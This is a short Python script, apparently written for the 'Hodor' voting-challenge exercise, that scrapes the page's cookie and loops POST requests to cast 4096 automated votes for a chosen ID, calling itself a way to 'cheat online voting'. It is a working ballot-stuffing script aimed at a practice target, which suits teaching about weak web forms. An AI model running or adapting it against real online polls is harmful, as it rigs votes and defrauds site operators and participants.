#!/usr/bin/python3
"""Program to upload 4096 votes to level_1
of hodor project"""
import requests


# Requests url by get method
url = 'http://158.69.76.135/level1.php'
my_id = '70'
r = requests.get(url)
# Get the cookies to use then in the post resquest
key = r.cookies['HoldTheDoor']
params = {'id': my_id, 'holdthedoor': 'Submit', 'key': key}
vote_success = 'Hold the Door challenge - Level 1'
cookie = {"HoldTheDoor": key}

# # Loop to make the votes by post method
print("Uploading votes ...")
vote = 1
while vote <= 4096:
    try:
        r = requests.post(url, data=params, cookies=cookie)
        if r.status_code is 200 and vote_success in r.text:
            print("Upload vote #{}".format(vote), end='\r', flush=True)
            vote += 1
    except Exception as error:
        print(error)
print("cheat online voting process ends :)")
